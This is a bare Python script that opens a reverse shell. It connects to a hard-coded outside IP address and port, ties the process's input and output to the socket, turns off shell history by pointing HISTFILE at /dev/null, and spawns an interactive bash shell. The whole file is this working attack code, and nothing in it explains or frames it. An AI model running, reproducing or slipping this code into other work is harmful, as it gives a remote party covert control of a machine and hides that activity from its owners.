import os
import pty
import socket

lhost = '13.209.161.15'
lport = 50101
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost,lport)); os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
os.putenv('HISTFILE', '/dev/null')
pty.spawn('/bin/bash')
s.close()
